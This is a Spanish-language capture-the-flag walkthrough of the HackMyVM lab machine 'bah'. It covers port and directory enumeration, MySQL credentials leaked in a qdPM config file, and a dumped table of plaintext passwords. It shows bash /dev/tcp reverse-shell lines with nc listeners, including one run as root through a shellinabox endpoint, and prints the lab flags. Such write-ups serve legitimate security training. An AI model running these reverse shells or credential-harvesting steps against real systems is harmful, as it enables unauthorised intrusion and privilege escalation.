---
icon: flag
---

# bah HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 03:18 EDT
Nmap scan report for 192.168.5.32
Host is up (0.0050s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: qdPM | Login
3306/tcp open  mysql   MariaDB 5.5.5-10.5.11
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.5.11-MariaDB-1
|   Thread ID: 32
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsCompression, Speaks41ProtocolOld, FoundRows, DontAllowDatabaseTableColumn, IgnoreSigpipes, LongColumnFlag, 
ConnectWithDatabase, InteractiveClient, Speaks41ProtocolNew, SupportsTransactions, SupportsLoadDataLocal, ODBCClient, IgnoreSpaceBeforeParenthesis, 
SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: L0Ll]l'zVz)VX8N_sFCZ
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:70:7F:B6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
```

Veremos que hay un puerto `80` y un `MySQL` por lo que primero vamos a ver que encontramos en el puerto `80` ya que parece ser que aloja una pagina web, si entramos veremos una pagina web con un `login` en el que no tenemos las credenciales, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.32/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5662]
/images               (Status: 403) [Size: 153]
/uploads              (Status: 403) [Size: 153]
/css                  (Status: 403) [Size: 153]
/template             (Status: 403) [Size: 153]
/core                 (Status: 403) [Size: 153]
/install              (Status: 200) [Size: 1815]
/js                   (Status: 403) [Size: 153]
/check.php            (Status: 200) [Size: 0]
/sf                   (Status: 403) [Size: 153]
/readme.txt           (Status: 200) [Size: 470]
/robots.txt           (Status: 200) [Size: 26]
/backups              (Status: 403) [Size: 153]
/batch                (Status: 403) [Size: 153]
^C
[!] Keyboard interrupt detected, terminating.
Progress: 79425 / 882244 (9.00%)
===============================================================
Finished
===============================================================
```

Vemos que nos muestra muchas cosas interesantes, pero tambien sabemos que esta utilizando una tecnologia que es publica y si todo lo ha dejado por defecto podremos ver las rutas de carpetas desde un repositorio de `GitHub` que tenga alojado este `Software` de pagina web.

Si buscamos `qdpm.net GitHub` en `Google` veremos el siguiente repositorio:

URL = [Repo GitHub qdpm](https://github.com/dodiksunaryo/qdpm/tree/master)

Si nos fijamos tiene la misma estructura que lo que nos muestra `Gobuster` por lo que vamos a investigar a ver que nos interesa, en principio estamos en busca de credenciales para el `login` o la `DDBB` que esta en el puerto de `MySQL`.

SI investigamos el repo veremos la siguiente ruta:

```
/core/config/
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-31 092800.png" alt=""><figcaption></figcaption></figure>

Vemos que hay un `databases.yml.sample`, vamos a probar dicha ruta en la pagina web.

```
URL = http://<IP>/core/config/databases.yml.sample
```

Veremos que efectivamente nos lo esta descargando, por lo que vamos a ver que encontramos dentro:

```sql
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=db_name;host=localhost'
      profiler: false
      username: db_username
      password: db_password
      attributes:
        quote_identifier: true
```

Veremos que es lo que viene por defecto como en el `GitHub`, vamos a probar a quitar `.sample` a ver si tuvieran una real que se esta utilizando.

```
URL = http://<IP>/core/config/databases.yml
```

Veremos que efectivamente nos descarga otro archivo y contiene lo siguiente:

```yml
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qpm;host=localhost'
      profiler: false
      username: qpmadmin
      password: "<?php echo urlencode('qpmpazzw') ; ?>"
      attributes:
        quote_identifier: true
```

Vemos ya credenciales que pueden ser validas para la conexion de `MySQL` vamos a probarlas de la siguiente manera.

## Escalate user qpmadmin

```shell
mysql --skip-ssl -s -h <IP> -u qpmadmin -pqpmpazzw
```

Info:

```
MariaDB [(none)]>
```

Con esto ya estaremos dentro, una vez dentro vamos a listar las `DDBBs` de `MySQL`.

```mysql
show databases;
```

Info:

```
Database
hidden
information_schema
mysql
performance_schema
qpm
```

Vamos a listar la de `hidden`.

```mysql
use hidden
show tables;
```

Info:

```
Tables_in_hidden
url
users
```

Ahora vamos a listar la de `url` y `users`.

> Tabla url

```mysql
select * from url;
```

Info:

```
id      url
1       http://portal.bah.hmv
2       http://imagine.bah.hmv
3       http://ssh.bah.hmv
4       http://dev.bah.hmv
5       http://party.bah.hmv
6       http://ass.bah.hmv
7       http://here.bah.hmv
8       http://hackme.bah.hmv
9       http://telnet.bah.hmv
10      http://console.bah.hmv
11      http://tmux.bah.hmv
12      http://dark.bah.hmv
13      http://terminal.bah.hmv
```

> Tabla users

```mysql
select * from users;
```

Info:

```
id      user    password
1       jwick   Ihaveafuckingpencil
2       rocio   Ihaveaflower
3       luna    Ihavealover
4       ellie   Ihaveapassword
5       camila  Ihaveacar
6       mia     IhaveNOTHING
7       noa     Ihaveflow
8       nova    Ihavevodka
9       violeta Ihaveroot
```

Vemos varias cosas interesantes, vamos a probar cual de esas `urls` es la correcta, vamos añadir todas esas `urls` a nuestro archivo `/etc/hosts` de esta forma:

```shell
nano /etc/hosts

#Dentro del nano

<IP_VICTIM>              bah.hmv portal.bah.hmv imagine.bah.hmv ssh.bah.hmv dev.bah.hmv party.bah.hmv ass.bah.hmv here.bah.hmv hackme.bah.hmv telnet.bah.hmv console.bah.hmv tmux.bah.hmv dark.bah.hmv terminal.bah.hmv
```

Lo guardamos y vamos probando uno por uno a ver cual es el que contiene algo diferente, si probamos con el llamado `party.bah.hmv` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-31 095405.png" alt=""><figcaption></figcaption></figure>

Veremos como una especie de `login` vamos a probar con las credenciales que encontramos para conectarnos por `MySQL`.

```
bah login: qpmadmin
password: qpmpazzw
```

Con esto estaremos dentro:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-31 095751.png" alt=""><figcaption></figcaption></figure>

Ahora vamos a generarnos una `reverse shell` para poder tener una shell mucho mejor de la que tenemos mediante la pagina web.

```shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Ahora desde la maquina `host` haremos lo siguiente:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos dicho comando desde la pagina web y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.32] 41042
qpmadmin@bah:~$ whoami
whoami
qpmadmin
```

Vemos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user rocio

Si recordamos antes, vimos credenciales en la `DDBB` de `MySQL` vamos a probarlas con el usuario `rocio` ya que es el unico que vemos que este en el sistema.

```shell
cat /etc/passwd | grep "/bin/bash"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
rocio:x:1000:1000:rocio,,,:/home/rocio:/bin/bash
qpmadmin:x:1001:1001:,,,:/home/qpmadmin:/bin/bash
```

Vamos hacer lo siguiente:

```shell
su rocio
```

Metemos como contraseña `Ihaveaflower` y veremos que estamos dentro.

Info:

```
rocio@bah:~$ whoami
rocio
```

Por lo que leeremos la `flag` del usuario.

> user.txt

```
HdsaMoiuVdsaeqw
```

## Escalate Privileges

Vamos a ver que procesos pasan por la maquina con un binario llamado `pspy64` el cual nos vamos a pasar a nuestra maquina victima.

Una vez que nos hayamos descargado el binario, nos lo pasaremos con un servidor de `python3` desde el `host` y en la maquina victima con un `wget` en la carpeta `/tmp` una vez echo esto, vamos a ejecutarlo.

```shell
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/05/31 04:07:51 CMD: UID=1000  PID=930    | ./pspy64 
2025/05/31 04:07:51 CMD: UID=1000  PID=903    | bash 
2025/05/31 04:07:51 CMD: UID=0     PID=902    | su rocio 
2025/05/31 04:07:51 CMD: UID=0     PID=901    | 
2025/05/31 04:07:51 CMD: UID=1001  PID=873    | bash 
2025/05/31 04:07:51 CMD: UID=1001  PID=872    | script /dev/null -c bash 
2025/05/31 04:07:51 CMD: UID=0     PID=859    | 
2025/05/31 04:07:51 CMD: UID=1001  PID=856    | bash -i 
2025/05/31 04:07:51 CMD: UID=1001  PID=851    | -bash 
2025/05/31 04:07:51 CMD: UID=1001  PID=846    | (sd-pam) 
2025/05/31 04:07:51 CMD: UID=1001  PID=845    | /lib/systemd/systemd --user 
2025/05/31 04:07:51 CMD: UID=0     PID=839    | login -p -h 127.0.0.1 
2025/05/31 04:07:51 CMD: UID=0     PID=828    | 
2025/05/31 04:07:51 CMD: UID=0     PID=827    | 
2025/05/31 04:07:51 CMD: UID=0     PID=787    | 
2025/05/31 04:07:51 CMD: UID=0     PID=727    | 
2025/05/31 04:07:51 CMD: UID=106   PID=524    | /usr/sbin/mariadbd 
2025/05/31 04:07:51 CMD: UID=33    PID=470    | php-fpm: pool www                                                             
2025/05/31 04:07:51 CMD: UID=33    PID=469    | php-fpm: pool www                                                             
2025/05/31 04:07:51 CMD: UID=33    PID=462    | nginx: worker process                            
2025/05/31 04:07:51 CMD: UID=0     PID=459    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/05/31 04:07:51 CMD: UID=107   PID=455    | /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css --no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/dev                                                                                      
2025/05/31 04:07:51 CMD: UID=107   PID=453    | /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css --no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/dev                                                                                      
2025/05/31 04:07:51 CMD: UID=0     PID=424    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2025/05/31 04:07:51 CMD: UID=0     PID=356    | /lib/systemd/systemd-logind 
2025/05/31 04:07:51 CMD: UID=0     PID=351    | /usr/sbin/rsyslogd -n -iNONE 
2025/05/31 04:07:51 CMD: UID=0     PID=346    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       
2025/05/31 04:07:51 CMD: UID=104   PID=325    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2025/05/31 04:07:51 CMD: UID=0     PID=324    | /usr/sbin/cron -f 
2025/05/31 04:07:51 CMD: UID=0     PID=307    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                                         
2025/05/31 04:07:51 CMD: UID=101   PID=278    | /lib/systemd/systemd-timesyncd 
2025/05/31 04:07:51 CMD: UID=0     PID=274    | 
2025/05/31 04:07:51 CMD: UID=0     PID=271    | 
2025/05/31 04:07:51 CMD: UID=0     PID=269    | 
2025/05/31 04:07:51 CMD: UID=0     PID=267    | 
2025/05/31 04:07:51 CMD: UID=0     PID=265    | 
2025/05/31 04:07:51 CMD: UID=0     PID=262    | 
2025/05/31 04:07:51 CMD: UID=0     PID=259    | 
2025/05/31 04:07:51 CMD: UID=0     PID=253    | 
2025/05/31 04:07:51 CMD: UID=0     PID=249    | 
2025/05/31 04:07:51 CMD: UID=0     PID=240    | 
2025/05/31 04:07:51 CMD: UID=0     PID=234    | 
2025/05/31 04:07:51 CMD: UID=0     PID=206    | /lib/systemd/systemd-udevd 
2025/05/31 04:07:51 CMD: UID=0     PID=181    | /lib/systemd/systemd-journald 
2025/05/31 04:07:51 CMD: UID=0     PID=147    | 
2025/05/31 04:07:51 CMD: UID=0     PID=146    | 
2025/05/31 04:07:51 CMD: UID=0     PID=110    | 
2025/05/31 04:07:51 CMD: UID=0     PID=109    | 
2025/05/31 04:07:51 CMD: UID=0     PID=108    | 
2025/05/31 04:07:51 CMD: UID=0     PID=107    | 
2025/05/31 04:07:51 CMD: UID=0     PID=106    | 
2025/05/31 04:07:51 CMD: UID=0     PID=105    | 
2025/05/31 04:07:51 CMD: UID=0     PID=104    | 
2025/05/31 04:07:51 CMD: UID=0     PID=66     | 
2025/05/31 04:07:51 CMD: UID=0     PID=65     | 
2025/05/31 04:07:51 CMD: UID=0     PID=62     | 
2025/05/31 04:07:51 CMD: UID=0     PID=52     | 
2025/05/31 04:07:51 CMD: UID=0     PID=51     | 
2025/05/31 04:07:51 CMD: UID=0     PID=50     | 
2025/05/31 04:07:51 CMD: UID=0     PID=49     | 
2025/05/31 04:07:51 CMD: UID=0     PID=48     | 
2025/05/31 04:07:51 CMD: UID=0     PID=47     | 
2025/05/31 04:07:51 CMD: UID=0     PID=46     | 
2025/05/31 04:07:51 CMD: UID=0     PID=45     | 
2025/05/31 04:07:51 CMD: UID=0     PID=44     | 
2025/05/31 04:07:51 CMD: UID=0     PID=43     | 
2025/05/31 04:07:51 CMD: UID=0     PID=25     | 
2025/05/31 04:07:51 CMD: UID=0     PID=24     | 
2025/05/31 04:07:51 CMD: UID=0     PID=23     | 
2025/05/31 04:07:51 CMD: UID=0     PID=22     | 
2025/05/31 04:07:51 CMD: UID=0     PID=21     | 
2025/05/31 04:07:51 CMD: UID=0     PID=20     | 
2025/05/31 04:07:51 CMD: UID=0     PID=19     | 
2025/05/31 04:07:51 CMD: UID=0     PID=18     | 
2025/05/31 04:07:51 CMD: UID=0     PID=17     | 
2025/05/31 04:07:51 CMD: UID=0     PID=15     | 
2025/05/31 04:07:51 CMD: UID=0     PID=14     | 
2025/05/31 04:07:51 CMD: UID=0     PID=13     | 
2025/05/31 04:07:51 CMD: UID=0     PID=12     | 
2025/05/31 04:07:51 CMD: UID=0     PID=11     | 
2025/05/31 04:07:51 CMD: UID=0     PID=10     | 
2025/05/31 04:07:51 CMD: UID=0     PID=9      | 
2025/05/31 04:07:51 CMD: UID=0     PID=6      | 
2025/05/31 04:07:51 CMD: UID=0     PID=4      | 
2025/05/31 04:07:51 CMD: UID=0     PID=3      | 
2025/05/31 04:07:51 CMD: UID=0     PID=2      | 
2025/05/31 04:07:51 CMD: UID=0     PID=1      | /sbin/init 
2025/05/31 04:08:22 CMD: UID=0     PID=937    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                                         
2025/05/31 04:08:22 CMD: UID=0     PID=938    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:22 CMD: UID=0     PID=939    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:22 CMD: UID=0     PID=940    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:22 CMD: UID=0     PID=941    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:22 CMD: UID=0     PID=942    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:22 CMD: UID=0     PID=943    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:22 CMD: UID=0     PID=944    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:22 CMD: UID=0     PID=945    | /bin/sh /sbin/dhclient-script 
2025/05/31 04:08:53 CMD: UID=0     PID=946    | 
2025/05/31 04:09:01 CMD: UID=0     PID=947    | /usr/sbin/CRON -f 
2025/05/31 04:09:01 CMD: UID=0     PID=948    | /usr/sbin/CRON -f 
2025/05/31 04:09:02 CMD: UID=0     PID=949    | /sbin/init 
...........................<RESTO DE PROCESOS>.....................................
```

Vemos que en esta parte de aqui:

```
2025/05/31 04:07:51 CMD: UID=107   PID=455    | /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css --no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/dev                                                                                      
2025/05/31 04:07:51 CMD: UID=107   PID=453    | /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css --no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/dev
```

Hace esto de forma desglosada.

|                                                                                                                                     |                                                                                |
| ----------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| `-q`                                                                                                                                | Modo silencioso (quiet).                                                       |
| `--background=...`                                                                                                                  | Crea un archivo PID para el demonio.                                           |
| `-c /var/lib/shellinabox`                                                                                                           | Directorio base para configuración.                                            |
| `-p 4200`                                                                                                                           | Expone el servicio en el puerto **4200**.                                      |
| `-u shellinabox -g shellinabox`                                                                                                     | Ejecuta como el usuario y grupo `shellinabox`.                                 |
| `--disable-ssl`                                                                                                                     | No usa HTTPS (¡peligroso si accesible remotamente!).                           |
| `--localhost-only`                                                                                                                  | Solo acepta conexiones locales (`127.0.0.1`).                                  |
| `-s /:LOGIN`                                                                                                                        | Crea un endpoint `/` que muestra una terminal de login normal.                 |
| `-s /devel:root:root:/:/tmp/dev`                                                                                                    | **Crea un endpoint `/devel` que abre una terminal como `root` en `/tmp/dev`**. |
| Esta claro que el mas interesante aqui es en el que crea un `endpoint` como el usuario `root`, por lo que vamos hacer lo siguiente: |                                                                                |

```shell
cd /tmp
nano dev

#Dentro del nano
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

```shell
chmod +x dev
```

Lo guardamos y nos ponemos a la escucha en la maquina `host`.

```shell
nc -lvnp <PORT>
```

Ahora teniendo todo, para ejecutar en `endpoint` tendremos que visitar dicho `endpoint` que se encuentra en `/devel`.

```
URL = http://party.bah.hmv/devel
```

Ahora si todo ha salido bien, cuando volvamos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.32] 35088
root@bah:/# whoami
whoami
root
```

Con esto veremos que ha funcionando, por lo que ya seremos `root` y leeremos la `flag` de `root`.

> root.txt

```
HMVssssshell323
```
